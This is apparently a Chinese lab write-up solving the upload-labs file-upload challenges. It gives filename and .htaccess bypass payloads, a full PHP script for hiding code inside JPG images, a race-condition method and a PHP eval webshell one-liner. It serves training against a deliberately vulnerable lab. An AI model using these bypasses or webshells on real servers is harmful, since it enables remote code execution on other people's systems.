---
typora-copy-images-to: ../images
typora-root-url: ..
---



## upload_labs writeup

环境是windows，这里我用了他提供的集成环境，注意要修改apache的配置文件，因为他里面的路径和自己本地的不同，如果不修改的话apache会一直启动不来。

#### Pass-01

这一关是客户端使用js对上传的文件后缀名进行校验，通过抓包修改就可以上传了，也可以禁用浏览器的js。

[![image-20200426105648683](/images/image-20200426105648683.png)

#### Pass-02

抓包，修改Content-Type为image/gif

![image-20200426110331359](/images/image-20200426110331359.png)

#### Pass-03

利用windows操作系统特性，上传不符合wnidows文件命名规则的文件

> shell.php%81
>
> 这里的%81需要在bp里进行urldecode

![image-20200426120038452](/images/image-20200426120038452.png)

查了下，发现我的做法和别人的不一样….. 原来是我环境有点问题

正常做法应该是传扩展名为php3、phtml等来绕过黑名单

![image-20200426160021563](/images/image-20200426160021563.png)

#### Pass-04

这一关也是一个个黑名单过滤，但是它的黑名单比上一关全很多，测试了一下，它基本把能过滤的都过滤了，但是它没有过滤.htaccess。

可以上传一个.htaccess文件，内容为：

> SetHandler application/x-httpd-php

![image-20200426160556907](/images/image-20200426160556907.png)

然后上传一个图片马，成功连接。

![image-20200426161059421](/images/image-20200426161059421.png)

这一关用上一关的思路也是可以的，构造不符合windows的文件后缀名

> shell.php%81 ==> shell.php

#### Pass-05

测试了一下，这一关也是黑名单过滤，它把.htaccess也过滤了。可以用后缀名大小写绕过。

![image-20200426161639178](/images/image-20200426161639178.png)

![image-20200426161652259](/images/image-20200426161652259.png)

#### Pass-06

扩展名后加空格绕过，或者加[%81-90]也可以绕过

> shell.php[空格]
>
> shell.php[%81-90]

#### Pass-07

扩展名后加.绕过

> shell.php.

![image-20200426194256948](/images/image-20200426194256948.png)

![image-20200426194314989](/images/image-20200426194314989.png)

#### Pass-08

利用windows文件流特性绕过

> shell.php::$DATA

![image-20200426200015641](/images/image-20200426200015641.png)

![image-20200426200948071](/images/image-20200426200948071.png)

#### Pass-09

后缀名加`. .`绕过，或者利用windows文件名特性绕过，后缀名加[%81-90]

> shell.php. .
>
> shell.php[%81-90]

![image-20200426202618896](/images/image-20200426202618896.png)

#### Pass-10

双写php绕过

> shell.pphphp

![image-20200426203446193](/images/image-20200426203446193.png)

#### Pass-11

测试了一下，发现这个是白名单过滤，只允许上传.jpg|.png|.gif类型的文件

![image-20200426203643031](/images/image-20200426203643031.png)

同时它文件保存的路径可以通过参数save_path控制，因为php版本小于5.3.4，存在%00截断问题。

控制save_path参数为`../upload/shell.php%00`，上传文件名为`shell.jpg`

![image-20200426204802854](/images/image-20200426204802854.png)

![image-20200426204822758](/images/image-20200426204822758.png)

#### Pass-12

文件保存路径可控，这一关和上一关的区别是save_path是通过POST请求传递的，所以%00要先进行一遍url解码，因为POST请回会对数据进行url编码。

![image-20200426210013352](/images/image-20200426210013352.png)

![image-20200426210026863](/images/image-20200426210026863.png)

#### Pass-13

这一关要上传.jpg|.gif|.png的图片马上去，然后通过文件包含漏洞去运行图片马。它对文件头前两个字节进行了检测，通过文件头判断是否是.jpg|.gif|.png。

在一句话木马前加上对应的文件头，然后上传上去就ok了

**.gif**

![image-20200426210721329](/images/image-20200426210721329.png)

![image-20200426210746983](/images/image-20200426210746983.png)

**.jpg**

![image-20200426210953501](/images/image-20200426210953501.png)

![image-20200426211021374](/images/image-20200426211021374.png)

**.png**

![image-20200426211112401](/images/image-20200426211112401.png)

![image-20200426211136230](/images/image-20200426211136230.png)

#### Pass-14

这一关也是上传图片马，它通过getimagesize()函数来检查图片类型。

getimagesize()函数通过检查文件头来判断文件类型，所以只要构造好文件头就可以了。

![image-20200426213356101](/images/image-20200426213356101.png)

#### Pass-15

这一关使用了exif_imagetype函数来判断图像类型，这个函数通过读取

图像的第一个字节来判断图片类型。只要加上对应的文件头就可以绕过了，思路和前两关都一样。

![image-20200427093635284](/images/image-20200427093635284.png)

#### Pass-16

这一关对上传的图片内容做了二次渲染。它将原本属于图片数据的部分提取了出来，再用自己的API或者函数进行渲染。通常php使用的是GD库，但是也可以绕过。基本方法是通过对比处理前和处理后的图片数据，找出没未经处理的数据区域，然后将代码插入。

**gif**

将上传后的文件下下来，用010editor打开，找到未被修改的区域将代码写入。

![image-20200427103613435](/images/image-20200427103613435.png)

![image-20200427103631639](/images/image-20200427103631639.png)

**png**

有两种方法，一种是将webshell写如PLTE数据块，另一种是写入IDAT数据块，具体制作方法参考这篇文章:http://0verflow.cn/?p=1502

**jpg**

用大佬写的脚本制作图片马

```php
<?php
    /*
    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.
    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>
    In case of successful injection you will get a specially crafted image, which should be uploaded again.
    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
    Sergey Bobrov @Black2Fan.
    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
    */
    $miniPayload = '<?php phpinfo();?>';
    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }
    set_error_handler("custom_error_handler");
    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;
        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }
        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp =
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    str_repeat("\0",$nullbytePayloadSize) .
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream =
                        substr($outStream, 0, $startPos) .
                        $miniPayload .
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');
    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }
    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }
    class DataInputStream {
        private $binData;
        private $order;
        private $size;
        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }
        public function seek() {
            return ($this->size - strlen($this->binData));
        }
        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }
        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }
        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }
        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

#### Pass-17

这一关提示我们源码审计，看了下他的源码发现存在条件竞争漏洞，它会先将上传的文件保存，然后再检查文件类型是否为jpg|png|gif中的一个，如果不是就会用unlink将文件删除。

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;
    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}

```

这里我通过bp的intruder模块来重复发包，先抓了一个访问shell.php的bao，然后设置好Payload type为Null Payloads，线程数为50

![image-20200427165037885](/images/image-20200427165037885.png)

然后shell.php那个包我是用hackhttp这个库发送的

![image-20200427165202468](/images/image-20200427165202468.png)

在跑脚本的同时运行intruder模块，返回状态码为200则说明成功访问到shell.php

![image-20200427163447698](/images/image-20200427163447698.png)

本来我是想直接写另一个马到服务器的…但是我的win10虚拟不知道为什么报错，php代码如下：

```
<?php    fputs(fopen("../poc.php","w"),'<?php @eval($_POST[cmd]);');?>
```

这个打开文件流时会报错，路径问题…看的很迷，linux的环境我没搭，下次试试再试试这个。

#### Pass-18

嗯嗯嗯，不会，看网上大佬的writeup说是条件竞争绕过文件重命名然后配合apache解析漏洞

#### Pass-19

%00截断，保存的文件名可控

> shell.php%00.jpg

![image-20200427171635954](/images/image-20200427171635954.png)

#### Pass-20

代码审计

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }
        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

它先检查MIME类型是否为jpeg|png|gif中的一种，然后判断save_name是否为数组，如果不是就用explode函数将它切分为数组。接着判断文件扩展名的时用到end(save_name)，也就是数组的最后一个，但是保存文件名时

后缀名用的是$file[count($file) - 1]。这里绕过只要使end(save_name) != $file([count($file) - 1]) 就可以了，然后还有一个绕过点是move_uploaded_file函数会忽略文件名末尾的/.

> save_name[0] = shell.php/
>
> save_name[2] = jpg

![image-20200427180106535](/images/image-20200427180106535.png)